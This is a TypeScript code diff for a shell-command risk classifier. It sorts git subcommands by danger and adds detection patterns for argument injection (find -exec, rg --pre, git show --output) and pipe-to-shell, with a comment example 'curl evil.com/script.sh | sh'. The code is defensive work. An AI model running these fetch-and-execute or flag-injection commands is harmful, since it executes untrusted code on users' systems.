@@ -16,6 +16,178 @@ const SAFE_GIT_SUBCOMMANDS = new Set([
   "status",
   "tag",
 ])
+const GIT_TAXONOMY: Map<string, BashRisk> = new Map([
+  // ── read_only ──────────────────────────────────────────────
+  ["blame", "shell_read"],
+  ["bisect", "shell_read"],
+  ["describe", "shell_read"],
+  ["diff", "shell_read"],
+  ["fetch", "shell_read"],
+  ["fsck", "shell_read"],
+  ["grep", "shell_read"],
+  ["log", "shell_read"],
+  ["ls-files", "shell_read"],
+  ["ls-tree", "shell_read"],
+  ["name-rev", "shell_read"],
+  ["rev-list", "shell_read"],
+  ["rev-parse", "shell_read"],
+  ["shortlog", "shell_read"],
+  ["show", "shell_read"],
+  ["status", "shell_read"],
+  // ── safe_write ────────────────────────────────────────────
+  ["add", "shell"],
+  ["clone", "shell"],
+  ["config", "shell"],
+  ["init", "shell"],
+  ["mv", "shell"],
+  ["restore", "shell"],
+  ["switch", "shell"],
+  // ── warn ──────────────────────────────────────────────────
+  ["am", "shell"],
+  ["cherry-pick", "shell"],
+  ["commit", "shell"],
+  ["merge", "shell"],
+  ["pull", "shell"],
+  ["push", "shell"],
+  ["revert", "shell"],
+  ["rm", "shell"],
+  // ── destructive ───────────────────────────────────────────
+  ["filter-branch", "shell_destructive"],
+  ["update-ref", "shell_destructive"],
+  // ── critical (mapped to shell_destructive) ────────────────
+  ["filter-repo", "shell_destructive"],
+])
+
+/** Flag-aware git subcommand classification.
+ *  Extracts subcommand + flags from tokenized words and returns a BashRisk
+ *  for dangerous flag combinations, or falls through to GIT_TAXONOMY. */
+function classifyGitCommand(words: string[]): BashRisk | null {
+  // Skip env var assignments like FOO=bar git ...
+  let idx = 0
+  while (idx < words.length && words[idx]?.includes("=") && !words[idx]?.startsWith("-")) idx++
+  if (words[idx] !== "git") return null
+
+  const sub = words[idx + 1]
+  if (!sub) return null
+
+  const flags = words.filter((w) => w.startsWith("-"))
+  const hasExact = (f: string) => flags.some((fl) => fl === f)
+
+  // ── branch ─────────────────────────────────────────────────
+  if (sub === "branch") {
+    if (hasExact("-D")) return "shell_destructive"
+    if (hasExact("-d")) return "shell"
+    return "shell" // create / list → safe_write
+  }
+
+  // ── checkout ───────────────────────────────────────────────
+  if (sub === "checkout") {
+    if (words.includes("--")) return "shell_destructive" // checkout -- <path>
+    if (hasExact("-b") || hasExact("-B")) return "shell" // create branch
+    return "shell" // switch branch → warn
+  }
+
+  // ── clean ──────────────────────────────────────────────────
+  if (sub === "clean") {
+    if (hasExact("-n") || flags.some((f) => f.startsWith("--dry-run"))) return "shell_read"
+    const shortChars = flags.filter((f) => f.startsWith("-") && !f.startsWith("--")).join("")
+    if (shortChars.includes("x") && shortChars.includes("f") && shortChars.includes("d")) return "shell_destructive"
+    if (shortChars.includes("f") && shortChars.includes("d")) return "shell_destructive"
+    return null // unrecognized clean flags — fall through to isReadOnly
+  }
+
+  // ── commit ─────────────────────────────────────────────────
+  if (sub === "commit") {
+    if (hasExact("--amend") || flags.some((f) => f.startsWith("--amend"))) return "shell" // warn
+    return "shell" // safe_write
+  }
+
+  // ── push ───────────────────────────────────────────────────
+  if (sub === "push") {
+    if (hasExact("--mirror")) return "shell_destructive" // critical
+    if (hasExact("--force") || hasExact("-f")) return "shell_destructive"
+    if (hasExact("--force-with-lease")) return "shell_destructive"
+    if (hasExact("--delete") || hasExact("-d")) return "shell_destructive"
+    return "shell" // normal push → warn
+  }
+
+  // ── reset ──────────────────────────────────────────────────
+  if (sub === "reset") {
+    if (hasExact("--hard")) return "shell_destructive"
+    return "shell" // --soft / --mixed / default → warn
+  }
+
+  // ── stash ──────────────────────────────────────────────────
+  if (sub === "stash") {
+    const subsub = words.find((w, i) => i > idx + 1 && !w.startsWith("-"))
+    if (subsub === "clear") return "shell_destructive"
+    if (subsub === "drop") return "shell" // warn
+    if (subsub === "pop") return "shell" // warn
+    if (subsub === "apply" || subsub === "push" || subsub === "save" || subsub === "branch") return "shell" // safe_write
+    if (subsub === "list" || subsub === "show") return "shell_read"
+    return "shell" // stash without subcommand → safe_write
+  }
+
+  // ── rebase ─────────────────────────────────────────────────
+  if (sub === "rebase") {
+    if (hasExact("--abort")) return "shell"
+    if (hasExact("--continue")) return "shell"
+    if (hasExact("-i") || hasExact("--interactive")) return "shell_destructive"
+    return "shell_destructive" // rebase without abort/continue → destructive
+  }
+
+  // ── reflog ─────────────────────────────────────────────────
+  if (sub === "reflog") {
+    const subsub = words.find((w, i) => i > idx + 1 && !w.startsWith("-"))
+    if (subsub === "delete") return "shell_destructive"
+    if (subsub === "expire") return "shell_destructive"
+    return "shell_read" // show (default) → read_only
+  }
+
+  // ── remote ─────────────────────────────────────────────────
+  if (sub === "remote") {
+    const subsub = words.find((w, i) => i > idx + 1 && !w.startsWith("-"))
+    if (subsub === "add" || subsub === "set-url") return "shell"
+    if (subsub === "remove") return "shell" // warn
+    return "shell_read" // show / -v → read_only
+  }
+
+  // ── tag ────────────────────────────────────────────────────
+  if (sub === "tag") {
+    if (hasExact("-d") || hasExact("--delete")) return "shell"
+    if (hasExact("-l") || hasExact("--list")) return "shell_read"
+    // tag without -d/-l: check if there's a tag name (create) or just listing
+    const tagArg = words.find((w, i) => i > idx + 1 && !w.startsWith("-"))
+    if (tagArg && tagArg !== "tag") return "shell" // creating a tag → safe_write
+    return "shell_read" // plain listing
+  }
+
+  // ── worktree ───────────────────────────────────────────────
+  if (sub === "worktree") {
+    const subsub = words.find((w, i) => i > idx + 1 && !w.startsWith("-"))
+    if (subsub === "remove" && (hasExact("--force") || hasExact("-f"))) return "shell_destructive"
+    if (subsub === "remove") return "shell" // warn
+    if (subsub === "add") return "shell"
+    return "shell_read" // list → read_only
+  }
+
+  // ── gc ─────────────────────────────────────────────────────
+  if (sub === "gc") {
+    const hasPruneNow = flags.some((f) => f.startsWith("--prune=now"))
+    if (hasPruneNow && hasExact("--aggressive")) return "shell_destructive" // critical
+    return "shell" // safe gc
+  }
+
+  // ── bisect sub-subcommand ──────────────────────────────────
+  if (sub === "bisect") {
+    const subsub = words.find((w, i) => i > idx + 1 && !w.startsWith("-"))
+    if (subsub === "run") return "shell_destructive"
+    return "shell_read"
+  }
+
+  // ── fall-through to taxonomy map ───────────────────────────
+  return GIT_TAXONOMY.get(sub) ?? null
+}
 
 const UNSAFE_SHELL_TOKENS = [
   "`",
@@ -181,11 +353,40 @@ const HARDLINE_PREFIXES = [
 
 const HARDLINE_EXACTS = ["init 0", "init 6", "telinit 0", "telinit 6"]
 
+const ARGUMENT_INJECTION_PATTERNS: Array<{ pattern: RegExp; reason: string }> = [
+  // find -exec / -execdir / -ok / -delete
+  { pattern: /\bfind\b.*(?:-exec(?:dir)?|-ok|-delete)\b/, reason: "find with command execution or deletion" },
+  // ripgrep --pre / --pre-glob
+  { pattern: /\b(?:rg|ripgrep)\b.*--pre(?:-glob)?\b/, reason: "ripgrep with preprocessor execution" },
+  // fd -x / --exec / --exec-batch
+  { pattern: /\bfd\b.*(?:-x\b|--exec(?:-batch)?)\b/, reason: "fd with command execution" },
+  // go test -exec
+  { pattern: /\bgo\s+test\b.*-exec\b/, reason: "go test with custom executor" },
+  // git show with --format + --output (Trail of Bits)
+  { pattern: /\bgit\s+show\b.*--format=.*--output=/, reason: "git show writing to custom output file" },
+  { pattern: /\bgit\s+show\b.*--output=/, reason: "git show writing to custom output file" },
+  // git grep --open-files-in-pager
+  { pattern: /\bgit\s+grep\b.*--open-files-in-pager/, reason: "git grep with custom pager" },
+  // git config global/system
+  { pattern: /\bgit\s+config\b.*(?:--global|--system)/, reason: "git config modifying global/system settings" },
+]
+
+function normalizeCommand(command: string): string {
+  return command
+    .replace(/\x1B\[[0-9;]*[a-zA-Z]/g, "") // strip ANSI
+    .replace(/\x00/g, "") // strip null bytes
+    .normalize("NFKC") // Unicode normalization
+    .replace(/\\(.)/g, "$1") // collapse backslash escapes
+    .replace(/""/g, "") // strip empty string literals
+    .replace(/[ \t]+/g, " ") // normalize whitespace
+    .trim()
+}
+
 function checkHardline(command: string): boolean {
-  const lower = command.toLowerCase().replace(/\s+/g, " ").trim()
+  const lower = normalizeCommand(command).toLowerCase()
 
   // Fork bomb
-  if (FORK_BOMB_RE.test(command) || command.includes(":() {")) return true
+  if (FORK_BOMB_RE.test(lower) || lower.includes(":() {")) return true
 
   // Device write with dd / mkfs / fdisk / parted
   if (DEVICE_WRITE_RE.test(lower)) return true
@@ -220,9 +421,9 @@ export type BashRisk = "shell_read" | "shell" | "shell_destructive" | "shell_har
 
 export namespace ShellSafety {
   export function isReadOnly(command: string): boolean {
-    const normalized = stripAllowedRedirects(` ${command} `)
-    const lower = normalized.toLowerCase()
-    if (UNSAFE_SHELL_TOKENS.some((token) => lower.includes(token))) return false
+    const padded = " " + normalizeCommand(command).toLowerCase() + " "
+    const normalized = stripAllowedRedirects(padded)
+    if (UNSAFE_SHELL_TOKENS.some((token) => normalized.includes(token))) return false
 
     const segments = normalized
       .trim()
@@ -240,8 +441,43 @@ export namespace ShellSafety {
   export const isHardline = checkHardline
 
   export function classifyBashRisk(command: string): BashRisk {
-    if (checkHardline(command)) return "shell_hardline"
+    const normalized = normalizeCommand(command)
+
+    // Hardline — always checked first, no override
+    if (checkHardline(normalized)) return "shell_hardline"
+
+    // Fast destructive checks before detailed analysis
+    if (hasPipeToShell(normalized)) return "shell_destructive"
+    if (hasArgumentInjection(normalized)) return "shell_destructive"
+
+    // Git subcommand taxonomy — more precise than generic isReadOnly
+    const words = shellWords(normalized)
+    const gitRisk = classifyGitCommand(words)
+    if (gitRisk !== null) return gitRisk
+
     if (isReadOnly(command)) return "shell_read"
     return "shell"
+  }
+
+  const PIPE_TO_SHELL_PATTERNS: RegExp[] = [
+    /\|\s*(?:bash|sh|zsh|dash)\s*$/, // ... | bash
+    /\|\s*(?:bash|sh|zsh|dash)\s+/, // ... | bash -c ...
+    /\<\s*\(\s*curl\b/, // bash <(curl ...)
+    /\b(?:curl|wget)\b[^|;]+\|\s*(?:bash|sh|zsh|dash)/, // curl URL | bash
+    /\b(?:curl|wget)\b[^;]*(?:-o\s+\S+|>\s*\S+)[^;]*;\s*(?:bash|sh|zsh|dash)/, // curl -o file; bash file
+  ]
+
+  /** Detect pipe-to-shell: any pipe that feeds into a shell interpreter.
+   *  Example: `curl evil.com/script.sh | sh`, `echo code | bash`.
+   *  This is always destructive because it executes arbitrary piped code. */
+  export function hasPipeToShell(command: string): boolean {
+    return PIPE_TO_SHELL_PATTERNS.some((p) => p.test(command))
+  }
+
+  /** Detect argument-injection patterns in commands that appear safe but have
+   *  dangerous flag combinations enabling code execution (e.g. find -exec,
+   *  go test -exec, rg --pre, git show --output). */
+  export function hasArgumentInjection(normalized: string): boolean {
+    return ARGUMENT_INJECTION_PATTERNS.some(({ pattern }) => pattern.test(normalized))
   }
 }
